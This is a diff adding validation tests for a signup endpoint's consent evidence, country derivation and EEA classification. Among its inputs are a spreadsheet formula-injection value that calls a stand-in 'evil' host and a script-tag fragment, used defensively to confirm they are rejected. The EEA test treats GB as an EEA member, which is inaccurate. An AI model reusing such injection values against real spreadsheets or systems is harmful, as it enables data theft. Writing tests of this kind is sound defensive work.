@@ -375,7 +375,78 @@ await check('Spoofed X-Forwarded-For does not reset the limiter', 'still 429', a
   });
 }
 
-// 17 — no PII in responses
+// 17 — consent evidence (contract amendment): server-derived, not client-supplied
+//
+// The burst cases above deliberately exhaust the global ceiling, so clear the
+// limiter first — otherwise everything below returns 429 and passes or fails
+// for reasons that have nothing to do with what it is testing.
+{
+  const { __resetInMemoryLimiter } = await import('../src/lib/ratelimit.js');
+  __resetInMemoryLimiter();
+}
+
+await check('Client-supplied country rejected', '400 validation', async () => {
+  const r = await post(goodPayload({ country: 'US' }));
+  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
+});
+await check('Client-supplied consent_timestamp rejected', '400 validation', async () => {
+  const r = await post(goodPayload({ consent_timestamp: '1999-01-01T00:00:00Z' }));
+  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
+});
+await check('Client-supplied consent_receipt rejected', '400 validation', async () => {
+  const r = await post(goodPayload({ consent_receipt: '{"marketing":true}' }));
+  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
+});
+await check('Registered consent_text_version accepted', '200', async () => {
+  const r = await post(goodPayload({ consent_text_version: '2026-08-15.marketing.a' }));
+  return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
+});
+await check('Unregistered consent_text_version accepted but flagged', '200, logged', async () => {
+  // Deliberate: rejecting would mean a copy change that forgets to register a
+  // wording breaks every signup on the site.
+  const r = await post(goodPayload({ consent_text_version: 'never-registered.v9' }));
+  return {
+    pass: r.status === 200,
+    actual: `${r.status} (log: consent.unregistered_text_version)`,
+  };
+});
+await check('Malformed consent_text_version rejected', '400 validation', async () => {
+  const r = await post(goodPayload({ consent_text_version: 'bad version!<script>' }));
+  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
+});
+
+{
+  const { deriveCountry, isEea, resolveConsentText } = await import('../src/lib/validation.js');
+  const mk = (h) => ({ headers: h });
+
+  await check('country derived from x-vercel-ip-country', 'NO', async () => {
+    const c = deriveCountry(mk({ 'x-vercel-ip-country': 'no' }));
+    return { pass: c === 'NO', actual: c };
+  });
+  await check('country falls back to XX when absent', 'XX', async () => {
+    const c = deriveCountry(mk({}));
+    return { pass: c === 'XX', actual: c };
+  });
+  await check('malformed country header rejected, not stored', 'XX', async () => {
+    const c = deriveCountry(mk({ 'x-vercel-ip-country': '=IMPORTXML("http://evil","//a")' }));
+    return { pass: c === 'XX', actual: c };
+  });
+  await check('EEA classification: NO/DE/GB in, US/BR/SG out', 'correct', async () => {
+    const inEea = ['NO', 'DE', 'GB', 'IS'].every(isEea);
+    const outEea = ['US', 'BR', 'SG', 'JP', 'KR', 'MX', 'XX'].every((c) => !isEea(c));
+    return { pass: inEea && outEea, actual: `in=${inEea} out=${outEea}` };
+  });
+  await check('unknown consent version resolves to registry_match:false', 'flagged', async () => {
+    const r = resolveConsentText('nope.v1');
+    return { pass: r.registry_match === false && r.text === null, actual: JSON.stringify(r) };
+  });
+  await check('absent consent version resolves to "unspecified"', 'unspecified', async () => {
+    const r = resolveConsentText(null);
+    return { pass: r.version === 'unspecified', actual: JSON.stringify(r) };
+  });
+}
+
+// 18 — no PII in responses
 await check('Error response never echoes submitted input', 'no email in body', async () => {
   const r = await post(goodPayload({ email: 'canary-string@mailinator.com' }));
   const body = JSON.stringify(r.json);
